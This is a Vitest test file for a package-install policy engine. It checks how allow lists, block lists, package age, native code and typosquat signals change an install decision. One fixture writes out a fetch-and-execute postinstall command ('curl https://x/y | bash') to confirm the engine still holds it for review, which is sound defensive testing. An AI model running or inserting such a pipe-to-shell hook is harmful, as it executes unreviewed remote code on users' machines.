import { describe, expect, it } from "vitest";
import { applyPolicy, parsePolicy, PolicyError, type PolicyFile } from "../src/policy.js";
import type { RiskAssessment } from "../src/types.js";
import { makeSignals } from "./helpers.js";

function makeAssessment(overrides: Partial<RiskAssessment> = {}): RiskAssessment {
  return {
    risk: "low",
    decision: "allow",
    summary: "ok",
    reasons: [],
    recommendedAction: "install",
    source: "rules",
    ...overrides,
  };
}

function policy(dp: PolicyFile["dependencyPolicy"]): PolicyFile {
  return { dependencyPolicy: dp };
}

describe("parsePolicy", () => {
  it("parses a valid policy", () => {
    const parsed = parsePolicy(
      `dependencyPolicy:\n  minPackageAgeDays: 14\n  allowKnownPackages:\n    - react\n`,
    );
    expect(parsed.dependencyPolicy.minPackageAgeDays).toBe(14);
    expect(parsed.dependencyPolicy.allowKnownPackages).toEqual(["react"]);
  });

  it("rejects missing dependencyPolicy key", () => {
    expect(() => parsePolicy("foo: bar")).toThrow(PolicyError);
  });

  it("rejects wrong types", () => {
    expect(() => parsePolicy("dependencyPolicy:\n  minPackageAgeDays: banana\n")).toThrow(
      PolicyError,
    );
    expect(() =>
      parsePolicy("dependencyPolicy:\n  requireApprovalForNativeCode: 'yes'\n"),
    ).toThrow(PolicyError);
  });
});

describe("applyPolicy", () => {
  it("escalates native code to require_approval when configured", () => {
    const result = applyPolicy(
      makeAssessment({ decision: "allow_with_warnings", risk: "medium" }),
      makeSignals({ hasNativeCode: true }),
      policy({ requireApprovalForNativeCode: true }),
    );
    expect(result.decision).toBe("require_approval");
    expect(result.reasons.at(-1)).toContain("[policy]");
  });

  it("escalates lifecycle scripts when configured", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ hasLifecycleScripts: true }),
      policy({ requireApprovalForLifecycleScripts: true }),
    );
    expect(result.decision).toBe("require_approval");
  });

  it("blocks young packages when blockRecentlyPublishedPackages is set", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ ageInDays: 2 }),
      policy({ blockRecentlyPublishedPackages: true, minPackageAgeDays: 7 }),
    );
    expect(result.decision).toBe("block");
  });

  it("requires approval for young packages when only minPackageAgeDays is set", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ ageInDays: 3 }),
      policy({ minPackageAgeDays: 30 }),
    );
    expect(result.decision).toBe("require_approval");
  });

  it("does not touch packages older than the minimum", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ ageInDays: 400 }),
      policy({ minPackageAgeDays: 30, blockRecentlyPublishedPackages: true }),
    );
    expect(result.decision).toBe("allow");
  });

  it("blocks packages without repository when configured", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ repositoryMissing: true }),
      policy({ blockMissingRepositoryForRuntimeDeps: true }),
    );
    expect(result.decision).toBe("block");
  });

  it("allowKnownPackages downgrades to allow", () => {
    const result = applyPolicy(
      makeAssessment({ decision: "require_approval", risk: "medium" }),
      makeSignals({ package: "react-native", hasLifecycleScripts: true }),
      policy({ allowKnownPackages: ["react-native"], requireApprovalForLifecycleScripts: true }),
    );
    expect(result.decision).toBe("allow");
  });

  it("allowKnownPackages cannot cross a deterministic BLOCK (curl|bash postinstall)", () => {
    // A compromised release of an allow-listed package: the version under
    // analysis matches the fetch-and-execute BLOCK rule. The name-based allow
    // list must not wave it through — it caps at require_approval so a human
    // reviews this exact version.
    const signals = makeSignals({
      package: "team-favorite",
      hasLifecycleScripts: true,
      lifecycleScripts: { postinstall: "curl https://x/y | bash" },
      scriptCommandFindings: [
        "postinstall script downloads content from the network: `curl https://x/y | bash`",
        "postinstall script invokes a shell: `curl https://x/y | bash`",
      ],
    });
    const result = applyPolicy(
      makeAssessment({ decision: "block", risk: "high" }),
      signals,
      policy({ allowKnownPackages: ["team-favorite"] }),
    );
    expect(result.decision).toBe("require_approval");
    expect(result.risk).toBe("high");
    expect(result.reasons.join(" ")).toContain("cannot override");
  });

  it("allowKnownPackages cannot cross a typosquat BLOCK", () => {
    const signals = makeSignals({
      package: "react-native-mmkv2",
      recentPublish: true,
      ageInDays: 2,
      nameSimilarity: { similarTo: "react-native-mmkv", distance: 1 },
    });
    const result = applyPolicy(
      makeAssessment({ decision: "block", risk: "high" }),
      signals,
      policy({ allowKnownPackages: ["react-native-mmkv2"] }),
    );
    expect(result.decision).toBe("require_approval");
  });

  it("allowKnownPackages NEVER overrides a known-malicious block", () => {
    const result = applyPolicy(
      makeAssessment({ decision: "block", risk: "high" }),
      makeSignals({ package: "evil-pkg", knownMalicious: true }),
      policy({ allowKnownPackages: ["evil-pkg"] }),
    );
    expect(result.decision).toBe("block");
  });

  it("blockPackages wins over allowKnownPackages", () => {
    const result = applyPolicy(
      makeAssessment(),
      makeSignals({ package: "left-pad" }),
      policy({ allowKnownPackages: ["left-pad"], blockPackages: ["left-pad"] }),
    );
    expect(result.decision).toBe("block");
  });

  it("never downgrades an already stricter decision", () => {
    const result = applyPolicy(
      makeAssessment({ decision: "block", risk: "high" }),
      makeSignals({ hasNativeCode: true }),
      policy({ requireApprovalForNativeCode: true }),
    );
    expect(result.decision).toBe("block");
  });
});
